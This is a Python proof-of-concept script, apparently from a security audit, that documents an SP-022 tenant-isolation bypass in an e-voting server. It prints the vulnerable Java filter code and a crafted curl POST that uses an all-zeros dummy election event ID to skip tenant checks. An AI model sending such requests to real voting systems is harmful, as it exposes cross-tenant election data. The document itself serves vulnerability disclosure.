#!/usr/bin/env python3
"""
PoC: SP-022 — DUMMY_ELECTION_EVENT_ID Tenant Isolation Bypass

The ContextWebFilter.java:190-194 allows requests with
DUMMY_ELECTION_EVENT_ID ("00000000000000000000000000000000") to bypass
all tenant context validation. The request passes through with NO tenant
set in the context, meaning:
  1. No database datasource targeting (queries hit default/shared DB)
  2. No tenant-based access control
  3. Path: configurevoterportal/electionevent/<dummy_id>

Source:
  ContextWebFilter.java:190-194 (ExchangeType.DUMMY_ELECTION_EVENT)
  ContextWebFilter.java:70      (chain.filter with no tenant context)
  Constants.java:14              (DUMMY_ELECTION_EVENT_ID = all zeros)
"""

import json

DUMMY_ELECTION_EVENT_ID = "00000000000000000000000000000000"

BASE_URL = "https://<voting-server>:8443"

BYPASS_ENDPOINT = (
    f"/api/v1/processor/voting/configurevoterportal"
    f"/electionevent/{DUMMY_ELECTION_EVENT_ID}"
)

print("=" * 60)
print("SP-022: DUMMY_ELECTION_EVENT_ID Tenant Bypass PoC")
print("=" * 60)
print()
print("Vulnerable code (ContextWebFilter.java:183-196):")
print()
print('  private ExchangeType determineCase(...) {')
print('    ...')
print('    } else if (containsPath(requestPath,')
print('        "configurevoterportal/electionevent/")')
print(f'        && DUMMY_ELECTION_EVENT_ID.equals(electionEventId)) {{')
print('      return ExchangeType.DUMMY_ELECTION_EVENT;  // <-- bypass')
print('    }')
print('  }')
print()
print("Handler (line 70):")
print('  case DUMMY_ELECTION_EVENT -> chain.filter(exchange);')
print('  // No tenant context set! Request proceeds without isolation.')
print()
print("--- Exploit Request ---")
print()

request = {
    "method": "POST",
    "url": f"{BASE_URL}{BYPASS_ENDPOINT}",
    "headers": {
        "Content-Type": "application/json",
    },
    "body": {
        "electionEventId": DUMMY_ELECTION_EVENT_ID,
        "note": "This request bypasses tenant isolation entirely"
    }
}

print(f"curl -X POST \\")
print(f'  "{BASE_URL}{BYPASS_ENDPOINT}" \\')
print(f'  -H "Content-Type: application/json" \\')
print(f'  -d \'{json.dumps(request["body"])}\'')
print()
print("Expected behavior:")
print("  - Request reaches controller with NO tenant in ContextHolder")
print("  - No tenant-scoped datasource selected")
print("  - Database operations target default/shared context")
print("  - Tenant isolation completely bypassed")
print()
print("Impact:")
print("  In a multi-tenant deployment, an attacker can access")
print("  cross-tenant election data by crafting requests to the")
print("  configurevoterportal endpoint with the dummy election ID.")
